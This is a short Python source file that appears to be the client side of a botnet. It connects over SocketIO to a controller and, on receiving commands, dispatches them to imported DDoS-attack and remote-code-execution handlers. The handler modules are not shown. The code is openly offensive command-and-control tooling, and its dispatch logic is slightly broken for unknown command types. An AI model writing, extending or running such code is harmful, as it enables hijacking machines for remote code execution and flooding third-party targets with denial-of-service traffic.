from commands.rce import CommandRCE
from commands.ddos import CommandDDoS
from commands.command import Command, CommandType
import socketio

socket_client = socketio.AsyncClient()

async def start_server() -> None:
    await socket_client.connect("ip")

# SocketIO event definitions
@socket_client.event
def connect():
    print('Connected to SocketIO server')

@socket_client.event
def connect_error(data):
    print("Failed to connect to SocketIO server")
    print(data)

@socket_client.event
def disconnect():
    print("Disconnected from SocketIO server")

@socket_client.on('command')
def on_command(sid: str, data):
    command: Command
    if data['type'] == CommandType.DDOS:
        command = CommandDDoS(data['target'])
    elif data['type'] == CommandType.RCE:
        command = CommandRCE(data['payload'])

    if command is not None:
        command.process()
    else:
        print('Error, command {} does not exists'.format(data['type']))
